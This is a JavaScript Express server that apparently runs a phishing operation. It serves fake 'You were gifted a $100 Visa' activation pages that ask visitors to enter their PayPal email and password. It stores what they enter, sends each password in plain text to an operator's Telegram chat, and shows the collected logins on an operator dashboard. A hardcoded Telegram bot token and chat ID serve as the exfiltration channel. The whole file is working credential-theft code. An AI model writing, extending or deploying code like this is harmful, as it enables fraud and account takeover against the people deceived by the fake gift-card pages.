import express from 'express';
import cors from 'cors';
import jwt from 'jsonwebtoken';
import fs from 'fs/promises';
import { Telegraf } from 'telegraf';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'your-secure-key-here';
const DATA_FILE = path.join(__dirname, 'data.json');
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7298585119:AAG-B6A6fZICTrYS7aNdA_2JlfnbghgnzAo';
const TELEGRAM_CHAT_ID_ADMIN = process.env.TELEGRAM_CHAT_ID_ADMIN || '6270110371';

const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

// CORS configuration
const corsOptions = {
    origin: ['https://visa-card-l.github.io', 'http://localhost:3000', 'https://ii-cyu4.onrender.com'],
    methods: ['GET', 'POST', 'DELETE'],
    credentials: true,
};
app.use(cors(corsOptions));
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Initialize data file
async function initializeDataFile() {
    try {
        await fs.access(DATA_FILE);
    } catch {
        await fs.writeFile(DATA_FILE, JSON.stringify({ users: [], cards: [], paypalLogins: [], logs: [] }));
    }
}
initializeDataFile();

// Middleware to verify JWT
async function verifyToken(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) {
        console.log('No token provided');
        return res.status(401).json({ error: 'No token provided' });
    }
    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        req.user = decoded;
        next();
    } catch (error) {
        console.error('Token verification failed:', error.message);
        return res.status(403).json({ error: 'Invalid token' });
    }
}

// Root route
app.get('/', (req, res) => {
    console.log('Root endpoint accessed');
    res.send('<h1>Backend</h1>');
});

// Activate.html route
app.get('/activate.html', async (req, res) => {
    const { cardId } = req.query;
    console.log('Activate.html accessed with cardId:', cardId);
    try {
        const data = JSON.parse(await fs.readFile(DATA_FILE, 'utf8'));
        const card = data.cards.find(c => c.cardId === cardId);
        if (!card) {
            console.log('Card not found for cardId:', cardId);
            return res.status(404).send('<h1>Card not found</h1>');
        }

        function formatExpDate(expDate) {
            if (!expDate || expDate.length !== 6) return 'N/A';
            const month = expDate.slice(0, 2);
            const year = expDate.slice(4, 6);
            return `${month}/${year}`;
        }

        const html = `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Activate Card</title>
                <style>
                    body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f7f9fa; }
                    .container { width: 400px; padding: 20px; background: #fff; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); text-align: center; }
                    .card { background: linear-gradient(135deg, #1e90ff, #000080, #ffd700); color: #fff; padding: 15px; border-radius: 10px; margin-bottom: 20px; }
                    .input-field { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
                    .btn { padding: 10px 20px; background: #0070ba; color: #fff; border: none; border-radius: 5px; cursor: pointer; }
                    .btn:hover { background: #005f9e; }
                    .gift-text { font-size: 16px; color: #333; margin-bottom: 20px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h2>Activate Card</h2>
                    <div class="card">
                        <div>Card Number: XXXX-XXXX-XXXX-${card.number?.slice(-4) || 'N/A'}</div>
                        <div>Cardholder: ${card.name || 'N/A'}</div>
                        <div>Exp: ${formatExpDate(card.expDate)}</div>
                        <div>CVV: ${card.cvv || 'N/A'}</div>
                        <div>Amount: $${parseFloat(card.amount || 0).toFixed(2)}</div>
                    </div>
                    <p class="gift-text">You were gifted a $100 Visa. Login with PayPal to activate</p>
                    <input type="text" class="input-field" id="paypalUsername" placeholder="PayPal Email">
                    <input type="password" class="input-field" id="paypalPassword" placeholder="PayPal Password">
                    <button class="btn" onclick="submitCredentials()">Submit</button>
                </div>
                <script>
                    async function submitCredentials() {
                        const paypalUsername = document.getElementById('paypalUsername').value.trim();
                        const paypalPassword = document.getElementById('paypalPassword').value.trim();
                        if (!paypalUsername || !paypalPassword) {
                            alert('Please enter both PayPal email and password');
                            return;
                        }
                        try {
                            const response = await fetch('/api/cards/paypal-creds', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ cardId: '${cardId}', paypalUsername, paypalPassword })
                            });
                            const data = await response.json();
                            if (response.ok) {
                                alert('Make sure the email and password are correct');
                            } else {
                                alert(data.error || 'Failed to submit credentials');
                            }
                        } catch (error) {
                            console.error('Submit credentials error:', error);
                            alert('Error: Network Error. Details: ' + error.message);
                        }
                    }
                </script>
            </body>
            </html>
        `;
        res.send(html);
    } catch (error) {
        console.error('Activate.html error:', error.message);
        res.status(500).send('<h1>Server Error</h1>');
    }
});

// Signup
app.post('/api/auth/signup', async (req, res) => {
    console.log('Signup request:', req.body, 'Origin:', req.get('origin'));
    try {
        const { username, password } = req.body;
        if (!username || !password) {
            console.log('Signup failed: Missing username or password');
            return res.status(400).json({ error: 'Username and password required' });
        }
        const data = JSON.parse(await fs.readFile(DATA_FILE, 'utf8'));
        if (data.users.find(u => u.username === username)) {
            console.log('Signup failed: Username already exists:', username);
            return res.status(400).json({ error: 'Username already exists' });
        }
        data.users.push({ username, password });
        await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2));
        data.logs.push({ action: 'signup', username, timestamp: new Date().toISOString() });
        await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2));
        console.log('Signup successful:', username);
        await bot.telegram.sendMessage(TELEGRAM_CHAT_ID_ADMIN, `New signup: ${username}`);
        res.json({ message: 'Signup successful' });
    } catch (error) {
        console.error('Signup endpoint error:', error.message);
        res.status(500).json({ error: 'Server error' });
    }
});

// Login
app.post('/api/auth/login', async (req, res) => {
    console.log('Login request:', req.body, 'Origin:', req.get('origin'));
    try {
        const { username, password } = req.body;
        if (!username || !password) {
            console.log('Login failed: Missing username or password');
            return res.status(400).json({ error: 'Username and password required' });
        }
        const data = JSON.parse(await fs.readFile(DATA_FILE, 'utf8'));
        const user = data.users.find(u => u.username === username && u.password === password);
        if (!user) {
            console.log('Login failed: Invalid credentials for:', username);
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });
        data.logs.push({ action: 'login', username, timestamp: new Date().toISOString() });
        await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2));
        console.log('Login successful:', username);
        await bot.telegram.sendMessage(TELEGRAM_CHAT_ID_ADMIN, `User logged in: ${username}`);
        res.json({ token });
    } catch (error) {
        console.error('Login endpoint error:', error.message);
        res.status(500).json({ error: 'Server error' });
    }
});

// Generate Card
app.post('/api/cards/generate', verifyToken, async (req, res) => {
    console.log('Generate card request:', req.body, 'User:', req.user.username);
    try {
        const { name, expDate, amount } = req.body;
        if (!name || !expDate || !amount || amount <= 0 || !/^\d{6}$/.test(expDate)) {
            console.log('Generate card failed: Invalid input');
            return res.status(400).json({ error: 'Invalid input' });
        }
        const data = JSON.parse(await fs.readFile(DATA_FILE, 'utf8'));
        const cardId = Math.random().toString(36).substr(2, 9);
        const number = `4${Math.random().toString().slice(2, 15)}`;
        const cvv = Math.floor(100 + Math.random() * 900).toString();
        data.cards.push({ cardId, name, expDate, amount, number, cvv, user: req.user.username, timestamp: new Date().toISOString(), status: 'pending' });
        data.logs.push({ action: 'generate_card', cardId, username: req.user.username, timestamp: new Date().toISOString() });
        await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2));
        console.log('Card generated:', cardId);
        await bot.telegram.sendMessage(TELEGRAM_CHAT_ID_ADMIN, `Card generated: ${cardId} by ${req.user.username}`);
        res.json({ cardId });
    } catch (error) {
        console.error('Generate card endpoint error:', error.message);
        res.status(500).json({ error: 'Server error' });
    }
});

// Get Cards
app.get('/api/cards', verifyToken, async (req, res) => {
    console.log('Fetch cards request for:', req.user.username);
    try {
        const data = JSON.parse(await fs.readFile(DATA_FILE, 'utf8'));
        const userCards = data.cards.filter(c => c.user === req.user.username);
        console.log('Cards fetched:', userCards.length);
        res.json(userCards);
    } catch (error) {
        console.error('Fetch cards endpoint error:', error.message);
        res.status(500).json({ error: 'Server error' });
    }
});

// Delete Card
app.delete('/api/cards/:cardId', verifyToken, async (req, res) => {
    console.log('Delete card request:', req.params.cardId, 'User:', req.user.username);
    try {
        const { cardId } = req.params;
        const data = JSON.parse(await fs.readFile(DATA_FILE, 'utf8'));
        const cardIndex = data.cards.findIndex(c => c.cardId === cardId && c.user === req.user.username);
        if (cardIndex === -1) {
            console.log('Delete card failed: Card not found or unauthorized');
            return res.status(404).json({ error: 'Card not found or unauthorized' });
        }
        data.cards.splice(cardIndex, 1);
        data.logs.push({ action: 'delete_card', cardId, username: req.user.username, timestamp: new Date().toISOString() });
        await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2));
        console.log('Card deleted:', cardId);
        await bot.telegram.sendMessage(TELEGRAM_CHAT_ID_ADMIN, `Card deleted: ${cardId} by ${req.user.username}`);
        res.json({ message: 'Card deleted' });
    } catch (error) {
        console.error('Delete card endpoint error:', error.message);
        res.status(500).json({ error: 'Server error' });
    }
});

// Submit PayPal Credentials
app.post('/api/cards/paypal-creds', async (req, res) => {
    console.log('Submit PayPal credentials request:', req.body);
    try {
        const { cardId, paypalUsername, paypalPassword } = req.body;
        if (!cardId || !paypalUsername || !paypalPassword) {
            console.log('Submit credentials failed: Missing fields');
            return res.status(400).json({ error: 'All fields required' });
        }
        const data = JSON.parse(await fs.readFile(DATA_FILE, 'utf8'));
        const card = data.cards.find(c => c.cardId === cardId);
        if (!card) {
            console.log('Submit credentials failed: Card not found');
            return res.status(404).json({ error: 'Card not found' });
        }
        data.paypalLogins.push({
            cardId,
            paypalUsername,
            paypalPassword,
            user: card.user,
            timestamp: new Date().toISOString(),
            status: 'pending'
        });
        data.logs.push({ action: 'submit_credentials', cardId, username: card.user, timestamp: new Date().toISOString() });
        await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2));
        console.log('Credentials submitted for cardId:', cardId);
        await bot.telegram.sendMessage(TELEGRAM_CHAT_ID_ADMIN, `PayPal credentials submitted for card: ${cardId}\nEmail: ${paypalUsername}\nPassword: ${paypalPassword}`);
        res.json({ message: 'Credentials submitted' });
    } catch (error) {
        console.error('Submit credentials endpoint error:', error.message);
        res.status(500).json({ error: 'Server error' });
    }
});

// Get PayPal Credentials
app.get('/api/cards/paypal-creds', async (req, res) => {
    console.log('Fetch PayPal credentials request');
    try {
        const data = JSON.parse(await fs.readFile(DATA_FILE, 'utf8'));
        console.log('PayPal credentials fetched:', data.paypalLogins.length);
        res.json({ paypalLogins: data.paypalLogins });
    } catch (error) {
        console.error('Fetch PayPal credentials endpoint error:', error.message);
        res.status(500).json({ error: 'Server error' });
    }
});

// Delete PayPal Credentials
app.delete('/api/cards/paypal-creds/:cardId', verifyToken, async (req, res) => {
    console.log('Delete PayPal credentials request:', req.params.cardId, 'User:', req.user.username);
    try {
        const { cardId } = req.params;
        const data = JSON.parse(await fs.readFile(DATA_FILE, 'utf8'));
        const loginIndex = data.paypalLogins.findIndex(l => l.cardId === cardId && l.user === req.user.username);
        if (loginIndex === -1) {
            console.log('Delete credentials failed: Credentials not found or unauthorized');
            return res.status(404).json({ error: 'Credentials not found or unauthorized' });
        }
        data.paypalLogins.splice(loginIndex, 1);
        data.logs.push({ action: 'delete_credentials', cardId, username: req.user.username, timestamp: new Date().toISOString() });
        await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2));
        console.log('PayPal credentials deleted for cardId:', cardId);
        await bot.telegram.sendMessage(TELEGRAM_CHAT_ID_ADMIN, `PayPal credentials deleted for card: ${cardId} by ${req.user.username}`);
        res.json({ message: 'Credentials deleted' });
    } catch (error) {
        console.error('Delete PayPal credentials endpoint error:', error.message);
        res.status(500).json({ error: 'Server error' });
    }
});

// Creator Dashboard
app.get('/api/creator/dashboard', verifyToken, async (req, res) => {
    console.log('Fetch dashboard request for:', req.user.username);
    try {
        if (req.user.username !== 'admin') {
            console.log('Dashboard access denied: Not admin');
            return res.status(403).json({ error: 'Access denied' });
        }
        const data = JSON.parse(await fs.readFile(DATA_FILE, 'utf8'));
        console.log('Dashboard data fetched:', { cards: data.cards.length, logins: data.paypalLogins.length });
        res.json({ generatedCards: data.cards, paypalLogins: data.paypalLogins });
    } catch (error) {
        console.error('Fetch dashboard endpoint error:', error.message);
        res.status(500).json({ error: 'Server error' });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
